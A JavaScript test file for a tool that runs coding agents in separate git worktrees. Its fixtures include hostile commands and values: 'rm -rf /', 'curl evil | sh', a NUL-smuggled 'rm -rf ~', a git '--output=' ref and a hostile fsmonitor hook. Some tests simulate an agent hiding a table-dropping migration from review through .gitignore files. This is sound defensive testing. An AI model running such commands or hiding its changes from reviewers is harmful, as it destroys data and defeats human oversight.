import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFile, execFileSync, spawn, spawnSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  prepareRepo, createWorkspace, removeWorkspace, diffStats, readRepoConfig, normalizeConfig, slugify, workspacesFolder,
  snapshotWork, workDiff, mergeWork, discardWork, gitGraph, gitIdentity, git as runGit, privateTemp, fillWorkspace, envValues, envValuesIn, isSaveFile,
} from '../src/core/workspace.mjs';
import { checkRules } from '../src/core/receipt.mjs';
import { isSaveFile as fileViewSaveFile } from '../src/core/files.mjs';

// Keep the person's own git settings (signing, hooks, default branch, name and email) out of these repositories, and
// their home and temporary folders out of these tests.
const ENV_KEYS = ['GIT_CONFIG_GLOBAL', 'GIT_CONFIG_NOSYSTEM', 'GIT_AUTHOR_NAME', 'GIT_AUTHOR_EMAIL', 'GIT_COMMITTER_NAME', 'GIT_COMMITTER_EMAIL',
  'HOME', 'XDG_CONFIG_HOME', 'TMPDIR', 'PATH'];
const savedEnv = Object.fromEntries(ENV_KEYS.map(k => [k, process.env[k]]));
const homeWorkbench = path.join(os.homedir(), '.workbench');
const homeWorkbenchExisted = fs.existsSync(homeWorkbench);

let T, repo, baseDir, c1, c2, tmp;

const git = (cwd, ...args) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const write = (file, text) => { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, text); };

const COMMITTED_CONFIG = {
  checks: [
    { name: 'Unit tests', run: 'npm test', timeoutSec: 120 },
    'npm run lint',
    { run: '' },
    { name: 'no command' },
    { name: 'Slow', run: 'make slow', timeoutSec: 99999 },
    { run: 'make fast', timeoutSec: -5 },
  ],
  rules: [
    { say: 'Leave the migrations alone', paths: ['db/migrations/**'] },
    { say: '', paths: ['x'] },
    { say: 'Docs are edited by hand', paths: 'docs/**' },
    { say: 'No paths here', paths: [] },
  ],
  allow: ['npm run e2e', '  npm   run  smoke ', '', 42],
  somethingElse: true,
};

before(() => {
  // These tests start thousands of git processes. On a Mac /usr/bin/git is a launcher that looks for the real git each
  // time (about 25 ms a start); the git it starts sits in git's own folder, so that goes first on PATH. Same git.
  const own = path.join(execFileSync('git', ['--exec-path'], { encoding: 'utf8' }).trim(), 'git');
  if (fs.existsSync(own) && execFileSync(own, ['--version'], { encoding: 'utf8' }) === execFileSync('git', ['--version'], { encoding: 'utf8' })) {
    process.env.PATH = `${path.dirname(own)}${path.delimiter}${process.env.PATH}`;
  }
  process.env.GIT_CONFIG_GLOBAL = '/dev/null';
  process.env.GIT_CONFIG_NOSYSTEM = '1';
  process.env.GIT_AUTHOR_NAME = process.env.GIT_COMMITTER_NAME = 'Workbench Test';
  process.env.GIT_AUTHOR_EMAIL = process.env.GIT_COMMITTER_EMAIL = 'test@example.invalid';
  T = fs.mkdtempSync(path.join(os.tmpdir(), 'wb-workspace-'));
  for (const [key, dir] of [['HOME', 'home'], ['XDG_CONFIG_HOME', 'xdg'], ['TMPDIR', 'tmp']]) {
    fs.mkdirSync(path.join(T, dir));
    process.env[key] = path.join(T, dir);
  }
  tmp = path.join(T, 'tmp');
  repo = path.join(T, 'repo');
  baseDir = path.join(T, 'worktrees');
  fs.mkdirSync(repo);
  git(repo, 'init', '-q', '-b', 'main');
  write(path.join(repo, 'a.txt'), 'one\ntwo\nthree\n');
  write(path.join(repo, 'src/b.js'), 'let b = 1;\nexport default b;\n');
  write(path.join(repo, 'r.txt'), 'r1\nr2\n');
  write(path.join(repo, '.gitignore'), 'ignored.log\n');
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', 'first');
  c1 = git(repo, 'rev-parse', 'HEAD');
  write(path.join(repo, 'workbench.json'), JSON.stringify(COMMITTED_CONFIG, null, 2));
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', 'add workbench.json');
  c2 = git(repo, 'rev-parse', 'HEAD');
  // Uncommitted changes in the person's folder: agents must never see these.
  write(path.join(repo, 'workbench.json'), JSON.stringify({ checks: [{ name: 'Evil', run: 'rm -rf /' }], allow: ['rm'] }));
  write(path.join(repo, 'scratch.txt'), 'not committed\n');
});

after(() => {
  for (const [k, v] of Object.entries(savedEnv)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  fs.rmSync(T, { recursive: true, force: true });
});

test('prepareRepo describes the repository', async () => {
  const info = await prepareRepo(repo);
  assert.equal(info.root, fs.realpathSync.native(repo));
  assert.equal(info.name, 'repo');
  assert.equal(info.head, c2);
  assert.match(info.head, /^[0-9a-f]{40}$/);
  assert.equal(info.branch, 'main');
  assert.equal(info.dirty, 2); // the edited workbench.json and the new scratch.txt
  // From a subfolder, the root is still the top of the repository.
  assert.equal((await prepareRepo(path.join(repo, 'src'))).root, info.root);
});

test('prepareRepo gives plain errors', async () => {
  await assert.rejects(prepareRepo(path.join(T, 'missing')), /does not exist/);
  await assert.rejects(prepareRepo(path.join(repo, 'a.txt')), /is a file, not a folder/);
  const plain = path.join(T, 'plain');
  fs.mkdirSync(plain);
  await assert.rejects(prepareRepo(plain), /is not a git repository/);
  const empty = path.join(T, 'empty');
  fs.mkdirSync(empty);
  git(empty, 'init', '-q', '-b', 'main');
  await assert.rejects(prepareRepo(empty), /has no commits yet/);
  await assert.rejects(prepareRepo(''), /No repository folder/);
});

test('the engine\'s git never starts a program named by core.fsmonitor', async () => {
  const r = path.join(T, 'fsmonitor');
  fs.mkdirSync(r);
  git(r, 'init', '-q', '-b', 'main');
  write(path.join(r, 'x.txt'), 'x\n');
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '-m', 'first');
  const marker = path.join(T, 'fsmonitor-ran');
  const hook = path.join(T, 'fsmonitor-hook.sh');
  write(hook, `#!/bin/sh\ntouch '${marker}'\n`);
  fs.chmodSync(hook, 0o755);
  git(r, 'config', 'core.fsmonitor', hook);
  // Prove the setting is live for a plain git status, so the test would catch a regression.
  git(r, 'status', '--porcelain');
  assert.equal(fs.existsSync(marker), true, 'plain git runs the fsmonitor program');
  fs.rmSync(marker);
  await prepareRepo(r); // runs git status inside the engine
  assert.equal(fs.existsSync(marker), false, 'the engine\'s git must not run it');
});

test('prepareRepo is not fooled by GIT_DIR in the environment', async () => {
  const saved = process.env.GIT_DIR;
  process.env.GIT_DIR = path.join(T, 'missing', '.git');
  try {
    assert.equal((await prepareRepo(repo)).head, c2);
  } finally {
    if (saved === undefined) delete process.env.GIT_DIR;
    else process.env.GIT_DIR = saved;
  }
});

test('git in a process group of its own (detached) ends the same ways as git started the usual way', async () => {
  const blob = git(repo, 'rev-parse', `${c1}:a.txt`);
  const ended = o => p => p.then(
    r => ({ stdout: Buffer.isBuffer(r.stdout) ? r.stdout.toString('hex') : r.stdout, stderr: r.stderr, code: r.code }),
    e => ({ failed: true, code: e.code, killed: !!e.killed, signal: e.signal ?? null, stdout: e.stdout, stderr: e.stderr, timedOut: o.timeout === 300 }));
  const cases = [
    [['rev-parse', 'HEAD']],
    [['rev-parse', '--verify', '--quiet', 'no-such-branch'], { okCodes: [1] }],
    [['rev-parse', '--verify', 'no-such-branch']],
    [['hash-object', '--stdin'], { input: 'some text\n' }],
    [['cat-file', 'blob', blob], { encoding: 'buffer' }],
    [['-c', 'alias.wait=!sleep 3', 'wait'], { timeout: 300 }],
    [['rev-parse', 'HEAD'], { env: { PATH: path.join(T, 'no-git-here') } }],
  ];
  for (const [args, o = {}] of cases) {
    const usual = await ended(o)(runGit(args, { cwd: repo, ...o }));
    const detached = await ended(o)(runGit(args, { cwd: repo, ...o, detached: true }));
    assert.deepEqual(detached, usual, args.join(' '));
  }
  // What each case shows: a failure's code and words, a stop at the timeout, and git not found.
  const fail = await runGit(['rev-parse', '--verify', 'no-such-branch'], { cwd: repo, detached: true }).catch(e => e);
  assert.equal(fail.code, 128);
  assert.match(fail.stderr, /^fatal: /);
  const slow = await runGit(['-c', 'alias.wait=!sleep 3', 'wait'], { cwd: repo, timeout: 300, detached: true }).catch(e => e);
  assert.deepEqual([slow.killed, slow.signal], [true, 'SIGTERM']);
  const none = await runGit(['rev-parse', 'HEAD'], { cwd: repo, detached: true, env: { PATH: path.join(T, 'no-git-here') } }).catch(e => e);
  assert.equal(none.code, 'ENOENT');
});

test('the folders that hold agents’ copies are private: ~/.workbench, worktrees/ and each repository’s folder are made 0700', async () => {
  // HOME is these tests' own temporary folder (see before()), so this is the default place, as a live run uses it.
  const top = path.join(process.env.HOME, '.workbench');
  assert.equal(fs.existsSync(top), false);
  const ws = await createWorkspace({ repoRoot: repo, agentId: 'pv0001', slug: 'private' });
  try {
    const mode = (p) => fs.statSync(p).mode & 0o777;
    assert.equal(path.dirname(path.dirname(ws.path)), fs.realpathSync.native(path.join(top, 'worktrees')));
    assert.equal(mode(top), 0o700);
    assert.equal(mode(path.join(top, 'worktrees')), 0o700);
    assert.equal(mode(path.dirname(ws.path)), 0o700);
  } finally {
    await removeWorkspace({ repoRoot: repo, path: ws.path, deleteBranch: true });
    fs.rmSync(top, { recursive: true, force: true });
  }
});

test('createWorkspace makes a worktree from the last commit, diffStats counts the changes, removeWorkspace cleans up', async () => {
  const root = fs.realpathSync.native(repo);
  const ws = await createWorkspace({ repoRoot: repo, agentId: 'a1b2c3', slug: 'Fix the flaky test!', baseDir });

  // Where it lives and what it is called.
  const hash = crypto.createHash('sha1').update(root).digest('hex').slice(0, 8);
  const folder = path.join(fs.realpathSync.native(baseDir), `repo-${hash}`);
  assert.equal(ws.path, path.join(folder, 'fix-the-flaky-test-a1b2c3'));
  assert.equal(workspacesFolder(repo, baseDir), path.join(baseDir, `repo-${hash}`));
  assert.equal(ws.branch, 'workbench/fix-the-flaky-test-a1b2c3');
  assert.equal(ws.base, c2);
  assert.equal(git(ws.path, 'rev-parse', '--abbrev-ref', 'HEAD'), ws.branch);
  assert.match(git(repo, 'worktree', 'list', '--porcelain'), new RegExp('worktree ' + ws.path.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
  // It has the committed files, not the person's uncommitted ones.
  assert.equal(fs.readFileSync(path.join(ws.path, 'a.txt'), 'utf8'), 'one\ntwo\nthree\n');
  assert.equal(JSON.parse(fs.readFileSync(path.join(ws.path, 'workbench.json'), 'utf8')).checks[0].name, 'Unit tests');
  assert.equal(fs.existsSync(path.join(ws.path, 'scratch.txt')), false);

  // Nothing changed yet.
  assert.deepEqual(await diffStats({ path: ws.path, base: ws.base }), { changed: 0, adds: 0, dels: 0, list: [] });

  // An agent's work: a commit, staged and unstaged edits, a rename, a deletion and new files.
  const w = f => path.join(ws.path, f);
  write(w('committed.txt'), 'c1\n');
  git(ws.path, 'add', 'committed.txt');
  git(ws.path, 'commit', '-q', '-m', 'agent commit', '--', 'committed.txt');
  write(w('a.txt'), 'one\nTWO\nthree\nfour\nfive\n'); // +3 -1
  fs.rmSync(w('src/b.js')); // -2
  git(ws.path, 'mv', 'r.txt', 'moved.txt'); // r.txt -2, moved.txt +2
  write(w('staged.txt'), 's1\ns2\n');
  git(ws.path, 'add', 'staged.txt'); // +2
  write(w('new.txt'), 'n1\nn2\nn3\nn4\n'); // +4
  write(w('nonl.txt'), 'x\ny'); // +2: a last line without a newline still counts
  write(w('bin.dat'), Buffer.from([0, 1, 2, 3, 0, 255])); // binary: listed, no lines
  write(w('ignored.log'), 'ignored\n'); // in .gitignore: not listed
  fs.symlinkSync('a.txt', w('link.txt')); // +1, the way git counts a link
  write(w('sub/deep/n.txt'), 'd\n'); // +1, inside a new folder

  const stats = await diffStats({ path: ws.path, base: ws.base });
  assert.deepEqual(stats.list, [
    { path: 'a.txt', adds: 3, dels: 1 },
    { path: 'bin.dat', adds: 0, dels: 0, untracked: true, binary: true },
    { path: 'committed.txt', adds: 1, dels: 0 },
    { path: 'link.txt', adds: 1, dels: 0, untracked: true },
    { path: 'moved.txt', adds: 2, dels: 0 },
    { path: 'new.txt', adds: 4, dels: 0, untracked: true },
    { path: 'nonl.txt', adds: 2, dels: 0, untracked: true },
    { path: 'r.txt', adds: 0, dels: 2 },
    { path: 'src/b.js', adds: 0, dels: 2 },
    { path: 'staged.txt', adds: 2, dels: 0 },
    { path: 'sub/deep/n.txt', adds: 1, dels: 0, untracked: true },
  ]);
  assert.equal(stats.changed, 11);
  assert.equal(stats.adds, 16);
  assert.equal(stats.dels, 5);
  // Compared with HEAD instead, the agent's own commit no longer shows.
  assert.equal((await diffStats({ path: ws.path })).list.some(f => f.path === 'committed.txt'), false);

  // A second agent gets its own folder; the same agent id twice is refused.
  const ws2 = await createWorkspace({ repoRoot: repo, agentId: 'd4e5f6', slug: '', baseDir });
  assert.equal(path.basename(ws2.path), 'task-d4e5f6');
  await assert.rejects(createWorkspace({ repoRoot: repo, agentId: 'a1b2c3', slug: 'Fix the flaky test!', baseDir }), /already exists/);
  await assert.rejects(createWorkspace({ repoRoot: repo, agentId: '../x', slug: 'x', baseDir }), /agent id/);
  await assert.rejects(createWorkspace({ repoRoot: path.join(T, 'missing'), agentId: 'abc', slug: 'x', baseDir }), /does not exist/);

  // Removing: only real workspaces, never the main folder, never an unrelated folder.
  const stray = path.join(folder, 'not-a-worktree');
  fs.mkdirSync(stray);
  assert.deepEqual(await removeWorkspace({ repoRoot: repo, path: stray }), { removed: false });
  assert.ok(fs.existsSync(stray));
  fs.rmdirSync(stray);
  await assert.rejects(removeWorkspace({ repoRoot: repo, path: repo }), /main folder/);
  await assert.rejects(removeWorkspace({ repoRoot: repo, path: 'relative/path' }), /No workspace folder/);

  const removed = await removeWorkspace({ repoRoot: repo, path: ws.path });
  assert.deepEqual(removed, { removed: true, branch: 'workbench/fix-the-flaky-test-a1b2c3' });
  assert.equal(fs.existsSync(ws.path), false);
  assert.doesNotMatch(git(repo, 'worktree', 'list', '--porcelain'), /fix-the-flaky-test-a1b2c3/);
  assert.equal(git(repo, 'branch', '--list', ws.branch).replace(/^[*+ ]+/, ''), ws.branch); // the branch is kept
  assert.ok(fs.existsSync(folder)); // still holds the second workspace

  // The second one, with its branch; its folder was already deleted by hand.
  fs.rmSync(ws2.path, { recursive: true, force: true });
  assert.deepEqual(await removeWorkspace({ repoRoot: repo, path: ws2.path, deleteBranch: true }), { removed: true, branch: 'workbench/task-d4e5f6' });
  assert.equal(git(repo, 'branch', '--list', ws2.branch), '');
  assert.doesNotMatch(git(repo, 'worktree', 'list', '--porcelain'), /task-d4e5f6/);
  assert.equal(fs.existsSync(folder), false); // the empty per-repository folder is gone too
  await assert.rejects(diffStats({ path: ws.path, base: c2 }), /no longer exists/);
});

test('diffStats lists new files hidden by a .gitignore the agent added or changed, and rules see them', async () => {
  const r = path.join(T, 'hiding');
  fs.mkdirSync(r);
  git(r, 'init', '-q', '-b', 'main');
  write(path.join(r, '.gitignore'), 'node_modules/\n');
  write(path.join(r, 'migrations/0001_init.sql'), 'create table users;\n');
  write(path.join(r, 'src/app.js'), 'export {};\n');
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '-m', 'first');
  const ws = await createWorkspace({ repoRoot: r, agentId: 'h1d3e5', slug: 'hide', baseDir });
  const w = f => path.join(ws.path, f);

  // Ignored by the repository's own rules from the start: not the agent's doing, so not listed.
  write(w('node_modules/pkg/index.js'), 'module.exports = 1;\n');
  assert.deepEqual(await diffStats({ path: ws.path, base: ws.base }), { changed: 0, adds: 0, dels: 0, list: [] });

  // The agent adds a migration and a .gitignore that hides it (and itself), hides a whole new folder the same way,
  // and adds dist/ to the repository's .gitignore after building into it.
  write(w('migrations/0099_drop_users.sql'), 'drop table users;\n');
  write(w('migrations/.gitignore'), '*\n');
  write(w('newdir/.gitignore'), '*\n');
  write(w('newdir/a.txt'), 'a\nb\n');
  write(w('newdir/node_modules/x.js'), 'x\n'); // inside the hidden folder, but the starting rules hid it anyway
  write(w('.gitignore'), 'node_modules/\ndist/\n');
  write(w('dist/out.js'), 'out\n');
  // Untouched by any new rule: a plain new file, and the starting rules' node_modules.
  write(w('notes.txt'), 'n\n');

  const stats = await diffStats({ path: ws.path, base: ws.base });
  assert.deepEqual(stats.list, [
    { path: '.gitignore', adds: 1, dels: 0 },
    { path: 'dist/out.js', adds: 1, dels: 0, untracked: true, ignored: true },
    { path: 'migrations/.gitignore', adds: 1, dels: 0, untracked: true, ignored: true },
    { path: 'migrations/0099_drop_users.sql', adds: 1, dels: 0, untracked: true, ignored: true },
    { path: 'newdir/.gitignore', adds: 1, dels: 0, untracked: true, ignored: true },
    { path: 'newdir/a.txt', adds: 2, dels: 0, untracked: true, ignored: true },
    { path: 'notes.txt', adds: 1, dels: 0, untracked: true },
  ]);
  assert.equal(stats.changed, 7);

  // The repository's rule about migrations sees the hidden migration.
  const rules = checkRules([{ say: 'Do not touch migrations/', paths: ['migrations/**'] }], stats.list.map(f => f.path));
  assert.deepEqual(rules, { kept: [], broken: [{ say: 'Do not touch migrations/', paths: ['migrations/.gitignore', 'migrations/0099_drop_users.sql'] }] });

  // Compared with a commit that already ignored dist/, dist/out.js is no longer the agent's doing.
  git(ws.path, 'add', '.gitignore');
  git(ws.path, 'commit', '-q', '-m', 'ignore dist', '--', '.gitignore');
  const later = await diffStats({ path: ws.path, base: git(ws.path, 'rev-parse', 'HEAD') });
  assert.equal(later.list.some(f => f.path === 'dist/out.js'), false);
  assert.equal(later.list.some(f => f.path === 'migrations/0099_drop_users.sql'), true);
  await removeWorkspace({ repoRoot: r, path: ws.path });
});

/** A repository with `files` committed, and a workspace of it where `agent` writes its files. */
let hidingRepos = 0;
async function hidingWorkspace(files, agent) {
  const r = path.join(T, `hiding-${++hidingRepos}`);
  fs.mkdirSync(r);
  git(r, 'init', '-q', '-b', 'main');
  for (const [f, text] of Object.entries(files)) write(path.join(r, f), text);
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '-m', 'first');
  const ws = await createWorkspace({ repoRoot: r, agentId: `hd${hidingRepos}x`, slug: 'hide', baseDir });
  for (const [f, text] of Object.entries(agent)) write(path.join(ws.path, f), text);
  return { r, ws };
}

test('diffStats finds a hidden file beside a visible one, and judges a folder by what the starting rules hid inside it', async () => {
  const start = 'node_modules/\nout/*\n!out/reports/\ngen/*\n!gen/keep/\nlogs/**\n';
  const { r, ws } = await hidingWorkspace(
    { '.gitignore': start, 'README.md': '#\n' },
    {
      // A new folder with a visible file, and a file its own .gitignore hides (git leaves that one out of a listing
      // made with --no-empty-directory). The same through the repository's .gitignore.
      'db/notes.md': 'notes\n', 'db/drop_users.sql': 'drop table users;\n', 'db/.gitignore': '*.sql\n',
      'api/readme.md': 'r\n', 'api/seed.sql': 'insert;\n',
      '.gitignore': start + 'api/seed.sql\nnest/\ngen/\n',
      // The starting rules hide out/* and gen/*, but not out/reports/ or gen/keep/, which the agent hides itself.
      // Asked about as "out/" or "gen/", out/* or gen/* would match the folder and take those with it. (git lists
      // gen/ alone, since the agent's rule names the folder.)
      'out/cache.bin': 'c\n', 'out/reports/q4.sql': 'drop\n', 'out/reports/.gitignore': '*\n',
      'gen/x.o': 'o\n', 'gen/keep/k.sql': 'k\n',
      // Hidden from the start: never the agent's doing.
      'logs/a.log': 'l\n', 'node_modules/p/i.js': 'x\n',
    });
  // A repository of its own inside the workspace, hidden by the agent: git cannot look into it, so it shows as a folder.
  const nest = path.join(ws.path, 'nest');
  write(path.join(nest, 'z.txt'), 'z\n');
  git(nest, 'init', '-q', '-b', 'main');

  const stats = await diffStats({ path: ws.path, base: ws.base });
  assert.deepEqual(stats.list.map(f => [f.path, !!f.ignored]), [
    ['.gitignore', false],
    ['api/readme.md', false], ['api/seed.sql', true],
    ['db/.gitignore', false], ['db/drop_users.sql', true], ['db/notes.md', false],
    ['gen/keep/k.sql', true],
    ['nest/', true],
    ['out/reports/.gitignore', true], ['out/reports/q4.sql', true],
  ]);
  assert.deepEqual(stats.list.find(f => f.path === 'db/drop_users.sql'), { path: 'db/drop_users.sql', adds: 1, dels: 0, untracked: true, ignored: true });
  const rules = checkRules([
    { say: 'No SQL files', paths: ['**/*.sql'] },
    { say: 'Leave the reports alone', paths: ['out/reports/**'] },
    { say: 'Leave the logs alone', paths: ['logs/**'] },
  ], stats.list.map(f => f.path));
  assert.deepEqual(rules, {
    kept: [{ say: 'Leave the logs alone' }],
    broken: [
      { say: 'No SQL files', paths: ['api/seed.sql', 'db/drop_users.sql', 'gen/keep/k.sql', 'out/reports/q4.sql'] },
      { say: 'Leave the reports alone', paths: ['out/reports/.gitignore', 'out/reports/q4.sql'] },
    ],
  });
  await removeWorkspace({ repoRoot: r, path: ws.path });
});

test('diffStats lists the files in every hidden folder, however many folders there are', async () => {
  // More folders than go to git in one command line (500 at a time).
  const agent = { '.gitignore': 'part-*/\n' };
  for (let k = 0; k < 520; k++) agent[`part-${k}/f.txt`] = `${k}\n`;
  const { r, ws } = await hidingWorkspace({ 'README.md': '#\n', '.gitignore': '*.log\n' }, agent);
  const stats = await diffStats({ path: ws.path, base: ws.base });
  const hidden = stats.list.filter(f => f.ignored).map(f => f.path);
  assert.equal(hidden.length, 520);
  assert.equal(new Set(hidden).size, 520);
  assert.ok(hidden.includes('part-0/f.txt') && hidden.includes('part-519/f.txt'));
  await removeWorkspace({ repoRoot: r, path: ws.path });
});

test('diffStats reads hidden names that git could take for pathspec magic as plain names', async () => {
  const hidden = async (files, agent) => {
    const { r, ws } = await hidingWorkspace(files, agent);
    const list = (await diffStats({ path: ws.path, base: ws.base })).list.filter(f => f.ignored).map(f => f.path);
    await removeWorkspace({ repoRoot: r, path: ws.path });
    return list;
  };
  // check-ignore refuses these as pathspec magic, which made the whole receipt fail.
  assert.deepEqual(await hidden({ 'README.md': '#\n' },
    { ':!x.txt': 'x\n', ':(glob)y.txt': 'y\n', ':(exclude)w.txt': 'w\n', '.gitignore': '/:*.txt\n' }),
  [':!x.txt', ':(exclude)w.txt', ':(glob)y.txt']);
  // A folder with such a name: its .gitignore is looked up in the starting commit by that name.
  assert.deepEqual(await hidden({ 'README.md': '#\n' }, { ':!d/secret.sql': 's\n', ':!d/.gitignore': '*.sql\n' }), [':!d/secret.sql']);
  // ":/z.txt" is z.txt in a folder named ":", not the z.txt at the top that the starting rules hide.
  assert.deepEqual(await hidden({ 'README.md': '#\n', '.gitignore': '/z.txt\n' }, { ':/z.txt': 'z\n', ':/.gitignore': 'z.txt\n' }), [':/z.txt']);
});

test('readRepoConfig reads workbench.json from the commit, not the working copy', async () => {
  const problems = [];
  const cfg = await readRepoConfig({ repoRoot: repo, ref: 'HEAD', onProblem: p => problems.push(p) });
  assert.deepEqual(cfg, {
    checks: [
      { name: 'Unit tests', run: 'npm test', timeoutSec: 120 },
      { name: 'npm run lint', run: 'npm run lint', timeoutSec: 300 },
      { name: 'Slow', run: 'make slow', timeoutSec: 3600 },
      { name: 'make fast', run: 'make fast', timeoutSec: 300 },
    ],
    rules: [
      { say: 'Leave the migrations alone', paths: ['db/migrations/**'] },
      { say: 'Docs are edited by hand', paths: ['docs/**'] },
    ],
    allow: ['npm run e2e', 'npm run smoke'],
  });
  assert.equal(problems.length, 6, problems.join('\n'));
  for (const p of problems) assert.match(p, /^[A-Z].*\.$/); // plain sentences
  // By commit id, too; and a commit without the file gives the defaults.
  assert.deepEqual((await readRepoConfig({ repoRoot: repo, ref: c2 })).allow, ['npm run e2e', 'npm run smoke']);
  assert.deepEqual(await readRepoConfig({ repoRoot: repo, ref: c1 }), { checks: [], rules: [], allow: [] });
  assert.deepEqual((await readRepoConfig({ repoRoot: repo })).checks.length, 4);
});

test('readRepoConfig refuses odd refs and survives bad files', async () => {
  const trap = path.join(T, 'trap.txt');
  await assert.rejects(readRepoConfig({ repoRoot: repo, ref: `--output=${trap}` }), /not a commit/);
  await assert.rejects(readRepoConfig({ repoRoot: repo, ref: 'HEAD..main' }), /not a commit/);
  await assert.rejects(readRepoConfig({ repoRoot: repo, ref: 'no-such-branch' }), /Could not read workbench.json/);
  assert.equal(fs.existsSync(trap), false);

  const other = path.join(T, 'other');
  fs.mkdirSync(other);
  git(other, 'init', '-q', '-b', 'main');
  write(path.join(other, 'workbench.json'), '{ not json');
  git(other, 'add', '-A');
  git(other, 'commit', '-q', '-m', 'bad json');
  const problems = [];
  assert.deepEqual(await readRepoConfig({ repoRoot: other, onProblem: p => problems.push(p) }), { checks: [], rules: [], allow: [] });
  assert.match(problems[0], /not valid JSON/);
  write(path.join(other, 'workbench.json'), '[1, 2]');
  git(other, 'commit', '-q', '-am', 'an array');
  problems.length = 0;
  assert.deepEqual(await readRepoConfig({ repoRoot: other, onProblem: p => problems.push(p) }), { checks: [], rules: [], allow: [] });
  assert.equal(problems.length, 1);
});

test('normalizeConfig and slugify', () => {
  assert.deepEqual(normalizeConfig({ checks: 'npm test', rules: null, allow: ['ls'] }), { checks: [], rules: [], allow: ['ls'] });
  const many = normalizeConfig({ checks: Array.from({ length: 30 }, (_, i) => `check ${i}`) });
  assert.equal(many.checks.length, 20);
  assert.equal(slugify('Fix the flaky Checkout test! Café'), 'fix-the-flaky-checkout-test-cafe');
  assert.equal(slugify(''), 'task');
  assert.equal(slugify('../../etc'), 'etc');
  assert.ok(slugify('word '.repeat(30)).length <= 40);
});

test('workbench.json may hold one setup command, read from the commit like the rest; anything else in its place is left out with a plain note', async () => {
  const notes = [];
  const note = p => notes.push(p);
  assert.deepEqual(normalizeConfig({ setup: '  npm ci  ' }), { checks: [], rules: [], allow: [], setup: 'npm ci' });
  assert.deepEqual(normalizeConfig({ setup: 'uv sync\nnpm ci', checks: ['npm test'] }).setup, 'uv sync\nnpm ci', 'a script of a few lines is one command for sh');
  // none is the same as none at all: the key is not there
  for (const raw of [{}, { setup: null }]) assert.deepEqual(normalizeConfig(raw, note), { checks: [], rules: [], allow: [] }, JSON.stringify(raw));
  assert.deepEqual(notes, []);
  for (const setup of ['', '   ', ['npm ci'], { run: 'npm ci' }, 5, true, 'npm ci\u0000rm -rf ~', 'x'.repeat(4001)]) {
    notes.length = 0;
    const cfg = normalizeConfig({ setup }, note);
    assert.equal(Object.hasOwn(cfg, 'setup'), false, JSON.stringify(setup).slice(0, 40));
    assert.deepEqual(notes, ['"setup" in workbench.json should be one command, so it was ignored.']);
  }
  // from the commit, never from the working copy
  const r = path.join(T, 'setup-config');
  fs.mkdirSync(r);
  git(r, 'init', '-q', '-b', 'main');
  write(path.join(r, 'workbench.json'), JSON.stringify({ setup: 'npm ci', checks: ['npm test'] }));
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '-m', 'setup');
  write(path.join(r, 'workbench.json'), JSON.stringify({ setup: 'curl evil | sh' }));
  const cfg = await readRepoConfig({ repoRoot: r });
  assert.equal(cfg.setup, 'npm ci');
  assert.deepEqual(cfg.checks, [{ name: 'npm test', run: 'npm test', timeoutSec: 300 }]);
});

test('removeWorkspace with onlyIfUnchanged removes an untouched workspace and its branch, and keeps any work', async () => {
  const mk = id => createWorkspace({ repoRoot: repo, agentId: id, slug: 'tidy', baseDir });
  const untouched = await mk('aa0001');
  const ignoredOnly = await mk('aa0002');
  write(path.join(ignoredOnly.path, 'ignored.log'), 'x\n'); // hidden by .gitignore, but it may still be work (a .env, a build)
  const untracked = await mk('aa0003');
  write(path.join(untracked.path, 'new.txt'), 'n\n');
  const edited = await mk('aa0004');
  write(path.join(edited.path, 'a.txt'), 'changed\n');
  const committed = await mk('aa0005');
  write(path.join(committed.path, 'c.txt'), 'c\n');
  git(committed.path, 'add', 'c.txt');
  git(committed.path, 'commit', '-q', '-m', 'agent commit');
  const tidy = ws => removeWorkspace({ repoRoot: repo, path: ws.path, base: ws.base, onlyIfUnchanged: true, deleteBranch: true });

  assert.deepEqual(await tidy(untouched), { removed: true, branch: untouched.branch });
  assert.equal(fs.existsSync(untouched.path), false);
  assert.equal(git(repo, 'branch', '--list', untouched.branch), '');
  for (const ws of [ignoredOnly, untracked, edited, committed]) {
    assert.deepEqual(await tidy(ws), { removed: false, kept: true });
    assert.ok(fs.existsSync(ws.path), `${ws.path} is kept`);
    assert.match(git(repo, 'branch', '--list', ws.branch), /workbench\/tidy-/);
  }
  await assert.rejects(removeWorkspace({ repoRoot: repo, path: edited.path, onlyIfUnchanged: true }), /not a commit/); // no base: refuse
  for (const ws of [ignoredOnly, untracked, edited, committed]) await removeWorkspace({ repoRoot: repo, path: ws.path, deleteBranch: true });
});

test('removeWorkspace with onlyIfUnchanged takes away a folder whose only extra files are the ones Workbench copied in, and keeps anything else', async () => {
  const t = await fillRepo({ '.gitignore': '.env\nnode_modules/\n.vercel/\nbuild.log\n', 'a.txt': 'a\n' });
  const base = git(t.ws, 'rev-parse', 'HEAD');
  // What fillWorkspace would have copied in, put there directly: whether node_modules can be copied depends on the disk
  // (no clones on ext4), and the copying has tests of its own.
  put(t.ws, { '.env': 'K=value\n', 'node_modules/pkg/index.js': 'x\n', '.vercel/.env.development.local': 'V=1\n' });
  const copied = ['.env', 'node_modules', '.vercel/.env.development.local'];
  const tidy = (more = {}) => removeWorkspace({ repoRoot: t.root, path: t.ws, base, onlyIfUnchanged: true, deleteBranch: true, ...more });
  // Without the list of what was copied, the copies may be work, as before.
  assert.deepEqual(await tidy(), { removed: false, kept: true });
  // An ignored file the agent made itself still keeps the folder, beside the copies and inside a folder git hides whole.
  write(path.join(t.ws, 'build.log'), 'made by the agent\n');
  assert.deepEqual(await tidy({ copied }), { removed: false, kept: true });
  fs.rmSync(path.join(t.ws, 'build.log'));
  write(path.join(t.ws, '.vercel/output.json'), '{}\n');
  assert.deepEqual(await tidy({ copied }), { removed: false, kept: true });
  fs.rmSync(path.join(t.ws, '.vercel/output.json'));
  // A change git sees keeps it too.
  write(path.join(t.ws, 'a.txt'), 'changed\n');
